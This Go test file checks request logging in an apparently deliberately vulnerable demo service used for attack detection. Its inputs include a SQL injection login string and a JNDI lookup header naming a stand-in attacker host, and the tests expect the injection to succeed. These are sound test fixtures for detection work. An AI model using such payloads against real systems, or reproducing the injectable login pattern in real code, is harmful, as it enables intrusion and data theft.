package http_test

import (
	"bytes"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/m-mizutani/gt"
	httpctrl "github.com/m-mizutani/semgate-example/pkg/controller/http"
)

// findLogRecord returns the first JSON log line whose msg is msg.
func findLogRecord(t *testing.T, out, msg string) map[string]any {
	t.Helper()
	for line := range strings.SplitSeq(strings.TrimSpace(out), "\n") {
		if line == "" {
			continue
		}
		var rec map[string]any
		gt.NoError(t, json.Unmarshal([]byte(line), &rec))
		if rec["msg"] == msg {
			return rec
		}
	}
	t.Fatalf("no %q record in log output:\n%s", msg, out)
	return nil
}

// logGroup reads a nested group, such as the request group written by
// requestAttrs.
func logGroup(t *testing.T, rec map[string]any, key string) map[string]any {
	t.Helper()
	group, ok := rec[key].(map[string]any)
	if !ok {
		t.Fatalf("%q is not a group in record %v", key, rec)
	}
	return group
}

// logValues reads one field of a query or headers group, whose values are
// always a list.
func logValues(t *testing.T, group map[string]any, key string) []string {
	t.Helper()
	raw, ok := group[key].([]any)
	if !ok {
		t.Fatalf("%q is not a list of values in group %v", key, group)
	}
	values := make([]string, 0, len(raw))
	for _, v := range raw {
		s, ok := v.(string)
		if !ok {
			t.Fatalf("%q holds a non-string value in group %v", key, group)
		}
		values = append(values, s)
	}
	return values
}

// stubBody is a request body whose reads and Close are driven by the test.
type stubBody struct {
	chunks []string
	err    error // returned after the last chunk; io.EOF for a body that ends
	closed bool
}

func (s *stubBody) Read(p []byte) (int, error) {
	if len(s.chunks) == 0 {
		return 0, s.err
	}
	n := copy(p, s.chunks[0])
	s.chunks = s.chunks[1:]
	return n, nil
}

func (s *stubBody) Close() error {
	s.closed = true
	return nil
}

// TestBodyRecorderStatus covers what the record says about a body for each way
// reading it can end. The recorder never reads on its own, so every case is
// driven by the reader above it.
func TestBodyRecorderStatus(t *testing.T) {
	t.Run("unread", func(t *testing.T) {
		_, recorded := httpctrl.RecordBody(&stubBody{chunks: []string{"payload"}, err: io.EOF}, 16)
		content, status := recorded()
		gt.String(t, content).Equal("")
		gt.String(t, status).Equal("unread")
	})

	t.Run("read to the end", func(t *testing.T) {
		body, recorded := httpctrl.RecordBody(&stubBody{chunks: []string{"pay", "load"}, err: io.EOF}, 16)
		_, err := io.ReadAll(body)
		gt.NoError(t, err)
		content, status := recorded()
		gt.String(t, content).Equal("payload")
		gt.String(t, status).Equal("read")
	})

	t.Run("partial", func(t *testing.T) {
		// One chunk read, and the reader stopped before the body ended.
		body, recorded := httpctrl.RecordBody(&stubBody{chunks: []string{"pay", "load"}, err: io.EOF}, 16)
		_, err := body.Read(make([]byte, 8))
		gt.NoError(t, err)
		content, status := recorded()
		gt.String(t, content).Equal("pay")
		gt.String(t, status).Equal("partial")
	})

	t.Run("truncated", func(t *testing.T) {
		body, recorded := httpctrl.RecordBody(&stubBody{chunks: []string{"payload"}, err: io.EOF}, 3)
		_, err := io.ReadAll(body)
		gt.NoError(t, err)
		content, status := recorded()
		gt.String(t, content).Equal("pay")
		gt.String(t, status).Equal("truncated")
	})

	t.Run("read error", func(t *testing.T) {
		body, recorded := httpctrl.RecordBody(
			&stubBody{chunks: []string{"pay"}, err: errors.New("connection reset")}, 16)
		_, err := io.ReadAll(body)
		gt.Error(t, err)
		content, status := recorded()
		gt.String(t, content).Equal("pay")
		gt.String(t, status).Equal("read_error")
	})
}

// TestBodyRecorderClosesSource pins that the recorder does not swallow the
// close of the body it wraps.
func TestBodyRecorderClosesSource(t *testing.T) {
	src := &stubBody{chunks: []string{"payload"}, err: io.EOF}
	body, _ := httpctrl.RecordBody(src, 16)
	gt.NoError(t, body.Close())
	gt.Bool(t, src.closed).True()
}

func TestDetectionLogCarriesRequestBody(t *testing.T) {
	var buf bytes.Buffer
	srv := httptest.NewServer(newTestServer(t, &buf))
	t.Cleanup(srv.Close)

	body := `{"username":"admin' OR '1'='1","password":"x"}`
	req, err := http.NewRequest(http.MethodPost, srv.URL+"/api/login", strings.NewReader(body))
	gt.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer secret-token")
	req.Header.Set("Cookie", "session=secret-session")
	res, err := http.DefaultClient.Do(req)
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()

	// The handler read the same bytes the record shows.
	gt.Number(t, res.StatusCode).Equal(http.StatusOK)
	env := decodeEnvelope(t, res.Body)
	gt.Bool(t, env.Exploited).True()

	rec := findLogRecord(t, buf.String(), "detection")
	gt.Value(t, rec["status"]).Equal(float64(http.StatusOK))

	request := logGroup(t, rec, "request")
	gt.Value(t, request["method"]).Equal(http.MethodPost)
	gt.Value(t, request["path"]).Equal("/api/login")
	gt.Value(t, request["body"]).Equal(body)
	gt.Value(t, request["body_status"]).Equal("read")
	gt.Value(t, request["content_length"]).Equal(float64(len(body)))
	gt.String(t, gt.Cast[string](t, request["remote_addr"])).IsNotEmpty()

	// Every header is recorded, the credential ones included.
	headers := logGroup(t, request, "headers")
	gt.Array(t, logValues(t, headers, "Authorization")).Equal([]string{"Bearer secret-token"})
	gt.Array(t, logValues(t, headers, "Cookie")).Equal([]string{"session=secret-session"})
	gt.Array(t, logValues(t, headers, "Content-Type")).Equal([]string{"application/json"})
}

func TestDetectionLogCarriesQueryAndHeader(t *testing.T) {
	var buf bytes.Buffer
	srv := httptest.NewServer(newTestServer(t, &buf))
	t.Cleanup(srv.Close)

	req, err := http.NewRequest(http.MethodGet, srv.URL+"/api/track?trace=abc", nil)
	gt.NoError(t, err)
	req.Header.Set("X-Log-Tag", "${jndi:ldap://attacker/x}")
	res, err := http.DefaultClient.Do(req)
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()
	gt.Number(t, res.StatusCode).Equal(http.StatusOK)

	request := logGroup(t, findLogRecord(t, buf.String(), "detection"), "request")
	gt.Value(t, request["raw_query"]).Equal("trace=abc")
	gt.Array(t, logValues(t, logGroup(t, request, "query"), "trace")).Equal([]string{"abc"})
	gt.Array(t, logValues(t, logGroup(t, request, "headers"), "X-Log-Tag")).
		Equal([]string{"${jndi:ldap://attacker/x}"})
	gt.Value(t, request["body_status"]).Equal("none")
	gt.Value(t, request["body"]).Equal("")
}

// TestDetectionLogMarksUnreadBody covers a body no one read: the endpoint
// answers from the query alone, so the record says the body was never read
// instead of leaving the field empty without explanation.
func TestDetectionLogMarksUnreadBody(t *testing.T) {
	var buf bytes.Buffer
	srv := httptest.NewServer(newTestServer(t, &buf))
	t.Cleanup(srv.Close)

	req, err := http.NewRequest(http.MethodGet, srv.URL+"/api/greet?name=Alice",
		strings.NewReader(strings.Repeat("a", 512)))
	gt.NoError(t, err)
	res, err := http.DefaultClient.Do(req)
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()
	gt.Number(t, res.StatusCode).Equal(http.StatusOK)

	request := logGroup(t, findLogRecord(t, buf.String(), "detection"), "request")
	gt.Value(t, request["body_status"]).Equal("unread")
	gt.Value(t, request["body"]).Equal("")
}

// TestDetectionLogCarriesStreamedBody covers a body sent chunked, whose length
// is not known in advance: the record still holds the bytes the handler read.
func TestDetectionLogCarriesStreamedBody(t *testing.T) {
	var buf bytes.Buffer
	srv := httptest.NewServer(newTestServer(t, &buf))
	t.Cleanup(srv.Close)

	// A reader of an unknown type makes net/http send the body chunked.
	body := `{"username":"admin' OR '1'='1","password":"x"}`
	req, err := http.NewRequest(http.MethodPost, srv.URL+"/api/login",
		io.NopCloser(strings.NewReader(body)))
	gt.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	res, err := http.DefaultClient.Do(req)
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()

	gt.Number(t, res.StatusCode).Equal(http.StatusOK)
	env := decodeEnvelope(t, res.Body)
	gt.Bool(t, env.Exploited).True()

	rec := findLogRecord(t, buf.String(), "detection")
	request := logGroup(t, rec, "request")
	gt.Value(t, request["body"]).Equal(body)
	gt.Value(t, request["body_status"]).Equal("read")
	gt.Value(t, request["content_length"]).Equal(float64(-1))
	// input still names the payload, which the handler parsed from the body.
	gt.Value(t, logGroup(t, rec, "input")["username"]).Equal("admin' OR '1'='1")
}
